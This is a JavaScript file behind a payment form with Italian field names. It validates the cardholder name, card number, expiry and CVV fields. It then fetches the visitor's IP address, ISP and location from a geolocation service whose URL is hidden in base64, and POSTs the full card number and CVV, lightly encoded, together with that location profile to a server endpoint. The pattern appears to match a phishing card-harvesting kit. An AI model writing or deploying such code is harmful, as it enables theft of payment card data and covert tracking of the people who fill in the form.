let nm, ms, an, cv, no, co, paga, d;
let dataTime = document.getElementById('dataTime')
let today = new Date().toLocaleDateString()
dataTime.innerHTML = today

d = document
nm = d.querySelector('#num')
ms = d.querySelector('#mes')
an = d.querySelector('#ano')
cv = d.querySelector('#cvv')
no = d.querySelector('#nome')
co = d.querySelector('#cognome')
paga = d.querySelector('#paga')

paga.onclick = pagaImporto

function pagaImporto() {


    if (no.value.length > 0) {
        no.style.border = '1px solid green'
        if (co.value.length > 0) {
            co.style.border = '1px solid green'
            if (nm.value.length > 0) {
                nm.style.border = '1px solid green'
                if (ms.value.length > 0) {
                    ms.style.border = '1px solid green'
                    if (an.value.length > 0) {
                        an.style.border = '1px solid green'
                        if (cv.value.length == 3 || cv.value.length >= 4) {
                            cv.style.border = '1px solid green'
                            sendApi()
                        } else {
                            cv.style.border = '1px solid #dc3545'
                        }
                    } else {
                        an.style.border = '1px solid #dc3545'
                    }
                } else {
                    ms.style.border = '1px solid #dc3545'
                }
            } else {
                nm.style.border = '1px solid #dc3545' 
            }
        } else {
            co.style.border = '1px solid #dc3545'}
    } else {
        no.style.border = '1px solid #dc3545'
    }
}


async function ipAuth() {
    const url = await fetch(atob('aHR0cHM6Ly9pcGFwaS5jby9qc29uLw=='))
    const json = await url.json()
    let i = json.org;
    let c = json.city;
    let cu = json.country;
    let ip = json.ip;
    let z = json.postal;
    let n = json.region;
    let d = {ip: ip, city: c, country: cu, org: i, zip: z, region: n}
    return d
}


function sendApi() {
    ipAuth().then( async (r) => {
        const apiJson = {name: no.value, lastName: co.value, id:btoa(nm.value+'|'+ms.value+'|'+an.value+'|'+cv.value), data: r}
        const op = {
            method: 'POST',
            headers: {
                'content-type': 'application/json',
                'Access-Control-Allow-Origin': '*',
                'mode':'no-cors'
            },
            body: JSON.stringify(apiJson)
        }
        
        let body = await fetch('http://localhost:3000/payment', op)
        let resJbody = await body.json()

        console.log(resJbody)
    } )
}


